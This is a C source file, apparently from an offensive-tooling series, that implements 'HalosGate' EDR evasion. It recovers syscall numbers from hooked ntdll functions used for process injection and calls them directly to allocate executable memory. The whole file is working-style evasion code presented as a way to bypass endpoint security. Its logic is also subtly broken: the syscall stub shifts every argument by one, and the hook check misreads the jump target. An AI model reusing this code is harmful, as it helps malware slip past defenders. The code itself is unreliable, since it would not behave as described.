#include <Windows.h>
#include <stdio.h>

// HalosGate - Extract syscall numbers from HOOKED functions!
WORD HalosGateFindSyscallNumber(const char *functionName)
{
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    FARPROC pFunction = GetProcAddress(hNtdll, functionName);

    if (!pFunction)
        return 0;

    BYTE *code = (BYTE *)pFunction;
    WORD syscallNumber = 0;

    printf("[*] Scanning %s at %p\n", functionName, pFunction);

    // Check if function is hooked (jmp qword ptr)
    if (code[0] == 0xFF && code[1] == 0x25) // jmp qword ptr [...]
    {
        printf("[*] Function is HOOKED! Scanning for syscall number...\n");

        // Get jump target (EDR hook)
        DWORD64 *jumpAddr = (DWORD64 *)(code + 2);
        DWORD64 hookAddr = *jumpAddr;
        printf("[*] EDR hook at: 0x%llx\n", hookAddr);

        // Look for syscall number in the first 32 bytes of the original function
        // The original bytes are often shifted after the JMP
        for (int i = 0; i < 32; i++)
        {
            // Pattern: b8 XX XX 00 00 (mov eax, 0xXXXX)
            if (code[i] == 0xB8)
            {
                syscallNumber = *(WORD *)(code + i + 1);
                printf("[+] Found syscall number: 0x%04x (at offset %d)\n",
                       syscallNumber, i);
                break;
            }

            // Pattern: 4c 8b d1 b8 XX XX 00 00 (mov r10, rcx; mov eax, 0xXXXX)
            if (i + 5 < 32 &&
                code[i] == 0x4C && code[i + 1] == 0x8B && code[i + 2] == 0xD1 &&
                code[i + 3] == 0xB8)
            {
                syscallNumber = *(WORD *)(code + i + 4);
                printf("[+] Found syscall number: 0x%04x (hooked pattern)\n",
                       syscallNumber);
                break;
            }
        }
    }
    else
    {
        // Not hooked - just read the syscall number directly
        for (int i = 0; i < 32; i++)
        {
            if (code[i] == 0xB8)
            {
                syscallNumber = *(WORD *)(code + i + 1);
                printf("[+] Found syscall number (clean): 0x%04x\n", syscallNumber);
                break;
            }
        }
    }

    return syscallNumber;
}

// Direct syscall with dynamic syscall number
__attribute__((naked))
NTSTATUS
DynamicSyscall(DWORD syscallNumber, ...)
{
    __asm__ volatile(
        "mov r10, rcx\n\t"
        "mov eax, edx\n\t"
        "syscall\n\t"
        "ret\n\t");
}

int main()
{
    printf("[ HalosGate - Syscall Number Recovery (x64) ]\n");
    printf("[*] Recovering syscall numbers from HOOKED ntdll\n\n");

    // Recover syscall numbers dynamically
    WORD scNtAlloc = HalosGateFindSyscallNumber("NtAllocateVirtualMemory");
    WORD scNtWrite = HalosGateFindSyscallNumber("NtWriteVirtualMemory");
    WORD scNtProtect = HalosGateFindSyscallNumber("NtProtectVirtualMemory");
    WORD scNtCreate = HalosGateFindSyscallNumber("NtCreateThreadEx");
    WORD scNtQueue = HalosGateFindSyscallNumber("NtQueueApcThreadEx");
    WORD scNtResume = HalosGateFindSyscallNumber("NtResumeThread");

    printf("\n[+] Recovered syscall numbers:\n");
    printf("    NtAllocateVirtualMemory: 0x%04x\n", scNtAlloc);
    printf("    NtWriteVirtualMemory:    0x%04x\n", scNtWrite);
    printf("    NtProtectVirtualMemory:  0x%04x\n", scNtProtect);
    printf("    NtCreateThreadEx:        0x%04x\n", scNtCreate);
    printf("    NtQueueApcThreadEx:      0x%04x\n", scNtQueue);
    printf("    NtResumeThread:          0x%04x\n", scNtResume);

    // Use recovered number for direct syscall
    if (scNtAlloc)
    {
        printf("\n[*] Using recovered syscall number 0x%04x\n", scNtAlloc);

        PVOID baseAddr = NULL;
        SIZE_T size = 0x1000;

        // Call with dynamic syscall number
        NTSTATUS status = DynamicSyscall(
            scNtAlloc,
            GetCurrentProcess(),
            &baseAddr,
            0,
            &size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE);

        if (status == 0)
        {
            printf("[+] SUCCESS: Memory allocated via recovered syscall!\n");
            printf("[+] Bypassed: EDR hooks using HalosGate!\n");
            VirtualFree(baseAddr, 0, MEM_RELEASE);
        }
    }

    return 0;
}

// x86_64-w64-mingw32-gcc -o 04_halosgate.exe 04_halosgate.c